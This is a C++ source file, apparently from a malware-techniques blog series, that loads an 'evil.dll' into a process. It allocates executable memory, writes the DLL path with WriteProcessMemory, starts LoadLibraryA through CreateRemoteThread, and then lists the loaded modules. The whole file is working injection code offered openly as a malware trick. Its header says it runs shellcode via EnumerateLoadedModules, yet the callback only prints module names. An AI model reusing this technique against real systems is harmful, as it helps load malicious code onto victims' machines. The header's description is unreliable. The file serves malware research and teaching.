/*
 * hack3.cpp - run shellcode via EnumerateLoadedModules. C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/malware/2022/12/21/malware-tricks-25.html
*/
#include <windows.h>
#include <dbghelp.h>
#include <iostream>

char evilDLL[] = "C:\\users\\test\\Desktop\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

// callback function
BOOL CALLBACK PrintModules(
  PSTR ModuleName,
  ULONG ModuleBase,
  ULONG ModuleSize,
  PVOID UserContext) {
  printf("%s\n", ModuleName);
   
  return TRUE;
}

int main(int argc, char* argv[]) {
  // inject a DLL into remote process

  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

  // himself process
  HANDLE ph = GetCurrentProcess();
  LPVOID rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // "copy" evil DLL between processes
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
  HANDLE rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);

  // enumerate modules
  printf("\nenumerate modules... \n");
  EnumerateLoadedModules(ph, (PENUMLOADED_MODULES_CALLBACK)PrintModules, NULL);

  CloseHandle(ph);

  return 0;
}

